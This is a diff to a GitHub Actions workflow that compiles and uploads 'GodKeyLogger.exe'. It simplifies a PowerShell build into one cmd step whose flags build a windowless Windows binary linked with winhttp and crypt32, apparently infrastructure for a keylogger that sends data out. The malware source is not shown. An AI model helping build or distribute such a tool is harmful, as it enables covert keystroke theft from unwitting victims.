@@ -1,81 +1,27 @@
-name: 🏗️ Build GodKeyLogger
+name: Build GodKeyLogger
 
-on:
-  push:
-    branches: [ main ]
-  workflow_dispatch:
+on: [push]
 
 jobs:
   build:
     runs-on: windows-latest
     
     steps:
-    - name: 📥 Checkout code
-      uses: actions/checkout@v4
-      
-    - name: 🔧 Setup Visual Studio 2022
-      uses: actions/setup-dotnet@v4
-      with:
-        dotnet-version: '6.0.x'
-        
-    - name: 🏗️ Build using MSBuild
-      shell: powershell
+    - uses: actions/checkout@v4
+    
+    - name: Build
+      shell: cmd
       run: |
-        Write-Host "=========================================" -ForegroundColor Green
-        Write-Host "   Building GodKeyLogger v2.0" -ForegroundColor Green
-        Write-Host "=========================================" -ForegroundColor Green
+        call "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
         
-        # Method 1: Direct compile with full path to cl.exe
-        $clPath = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\14.38.33130\bin\Hostx64\x64\cl.exe"
-        $linkPath = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Tools\MSVC\14.38.33130\bin\Hostx64\x64\link.exe"
+        cl.exe /nologo /EHsc /O2 /std:c++17 ^
+          /DUNICODE /D_UNICODE /MT ^
+          GodKeyLogger.cpp ^
+          /link /SUBSYSTEM:WINDOWS ^
+          /OUT:GodKeyLogger.exe ^
+          user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
         
-        if (Test-Path $clPath) {
-            Write-Host "✅ Found cl.exe at: $clPath" -ForegroundColor Cyan
-            
-            & $clPath /nologo /EHsc /Ox /W2 /std:c++17 `
-              /DUNICODE /D_UNICODE /MT `
-              GodKeyLogger.cpp `
-              /link /SUBSYSTEM:WINDOWS `
-              /OUT:GodKeyLogger.exe `
-              user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib
-              
-            if ($LASTEXITCODE -eq 0) {
-                Write-Host "✅ Compilation successful!" -ForegroundColor Green
-            } else {
-                Write-Host "❌ Compilation failed!" -ForegroundColor Red
-                exit 1
-            }
-        } else {
-            Write-Host "❌ cl.exe not found!" -ForegroundColor Red
-            Write-Host "Trying alternative location..." -ForegroundColor Yellow
-            
-            # Alternative: Use Developer Command Prompt
-            $vcvars = "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
-            if (Test-Path $vcvars) {
-                cmd /c "`"$vcvars`" && cl.exe /nologo /EHsc /Ox GodKeyLogger.cpp /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe user32.lib gdi32.lib advapi32.lib winhttp.lib"
-            } else {
-                Write-Host "❌ Could not find Visual Studio tools" -ForegroundColor Red
-                exit 1
-            }
-        }
-        
-    - name: ✅ Verify build
-      shell: powershell
-      run: |
-        if (Test-Path "GodKeyLogger.exe") {
-            $file = Get-Item "GodKeyLogger.exe"
-            Write-Host "✅ BUILD SUCCESSFUL!" -ForegroundColor Green
-            Write-Host "📁 File: $($file.Name)" -ForegroundColor Cyan
-            Write-Host "📦 Size: $($file.Length) bytes" -ForegroundColor Cyan
-            Write-Host "📍 Path: $($file.FullName)" -ForegroundColor Cyan
-        } else {
-            Write-Host "❌ BUILD FAILED: Executable not created!" -ForegroundColor Red
-            Get-ChildItem -Filter *.exe
-            exit 1
-        }
-        
-    - name: 📤 Upload artifact
-      uses: actions/upload-artifact@v4
+    - uses: actions/upload-artifact@v4
       with:
         name: GodKeyLogger
         path: GodKeyLogger.exe
